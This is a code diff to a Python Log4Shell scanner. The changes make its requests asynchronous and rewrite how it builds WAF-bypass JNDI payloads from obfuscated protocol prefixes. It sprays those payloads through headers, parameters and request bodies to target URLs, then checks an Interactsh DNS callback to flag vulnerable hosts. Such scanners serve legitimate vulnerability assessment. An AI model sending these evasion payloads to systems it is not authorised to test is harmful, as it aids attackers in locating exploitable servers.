@@ -23,6 +23,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+from requests_futures.sessions import FuturesSession
 
 
 # Disable SSL warnings
@@ -58,7 +59,7 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}}"]
 
-protocols = [f'jndi:rmi',
+protocols = [f'jndi:rmi:',
             f"jndi:dns:",
             f'j${{k8s:k5:-ND}}i${{sd:k5:-:}}',
             f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
@@ -147,11 +148,7 @@ def get_fuzzing_post_data(payload):
 
 
 def generate_waf_bypass_payloads(callback_host, random_string):
-    payloads = []
-    for i in waf_bypass_payloads:
-        new_payload = i.replace("{{callback_host}}", callback_host)
-        new_payload = new_payload.replace("{{random}}", random_string)
-        payloads.append(new_payload)
+    payloads = [f'${{{p}//{callback_host}/{random_string}}}' for p in protocols]
     return payloads
 
 
@@ -186,7 +183,7 @@ class Interactsh:
         self.domain = f'{guid}.{self.server}'
         self.correlation_id = self.domain[:20]
 
-        self.session = requests.session()
+        self.session = FuturesSession(max_workers=12)
         self.session.headers = self.headers
         self.register()
 
@@ -253,6 +250,7 @@ def parse_url(url):
             "host":  urlparse.urlparse(url).netloc.split(":")[0],
             "file_path": file_path})
 
+async_session = FuturesSession(max_workers=12)
 
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
@@ -265,8 +263,7 @@ def scan_url(url, callback_host):
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
-                requests.request(url=url,
-                                 method="GET",
+                async_session.get(url=url,
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
@@ -277,8 +274,7 @@ def scan_url(url, callback_host):
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
                 # Post body
-                requests.request(url=url,
-                                 method="POST",
+                async_session.post(url=url,
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
@@ -289,8 +285,7 @@ def scan_url(url, callback_host):
 
             try:
                 # JSON body
-                requests.request(url=url,
-                                 method="POST",
+                async_session.post(url=url,
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
@@ -337,7 +332,7 @@ def main():
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
     cprint("[•] Waiting...", "cyan")
-    time.sleep(args.wait_time)
+    time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
         cprint("[•] Targets does not seem to be vulnerable.", "green")
